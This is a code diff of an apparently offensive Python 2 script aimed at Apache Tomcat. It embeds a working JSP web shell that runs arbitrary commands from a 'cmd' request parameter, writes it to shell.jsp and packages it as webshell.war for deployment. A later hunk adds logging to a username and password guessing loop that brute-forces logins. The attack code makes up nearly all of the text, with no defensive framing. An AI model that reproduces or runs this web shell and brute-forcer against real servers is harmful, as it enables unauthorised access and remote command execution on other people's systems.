@@ -8,14 +8,22 @@ import getopt
 import base64
 import requests
 import os
-JSPcode="<FORM METHOD=GET ACTION='index.jsp'>\n<INPUT name='cmd' type=text>\n<INPUT type=submit value='Run'>\n</FORM>\n<%@ page import='java.io.' %>\n<%\n   String cmd = request.getParameter('cmd');\n   String output = '';\n   if(cmd != null) {\n      String s = null;\n      try {\n         Process p =\nRuntime.getRuntime().exec(cmd,null,null);\n         BufferedReader sI = new BufferedReader(new\nInputStreamReader(p.getInputStream()));\n         while((s =\nsI.readLine()) != null) { output += s+'</br>'; }\n      }  catch(IOException e) {   e.printStackTrace();   }\n   }\n%>\n<pre><%=output %></pre>" 
+JSPcode='''<FORM METHOD=GET ACTION='index.jsp'> <INPUT name='cmd' type=text> <INPUT type=submit value='Run'> </FORM> <%@ page import="java.io.*" %> <%    String cmd = request.getParameter("cmd");    String output = "";    if(cmd != null) {       String s = null;       try {          Process p = Runtime.getRuntime().exec(cmd,null,null);          BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));          while((s = sI.readLine()) != null) { output += s+"</br>"; }       }  catch(IOException e) {   e.printStackTrace();   }    } %> <pre><%=output %></pre>'''
+print "Creating a directory called tomcat...." 
 os.mkdir('tomcat')
+print "created!!"
+time.sleep(2)
+print "Writting to it a shell code..."
 shell=open("./tomcat/shell.jsp","w")
 shell.write(JSPcode)
 shell.close()
+print "Done!!"
+time.sleep(1)
+print "Creating a war shell"
+time.sleep(2)
 os.chdir('./tomcat')
 os.system('jar -cvf ../webshell.war *')
-
+print "done!!"
 
 # Clear the screen
 subprocess.call('clear', shell=True)
@@ -87,6 +95,9 @@ try:
 				print "Password: %s" %pwd
 				
  				sock.close()
+			else:
+				print "trying %s:%s"%(usr,pwd)
+				print "failed attempt..."
 
 			
 
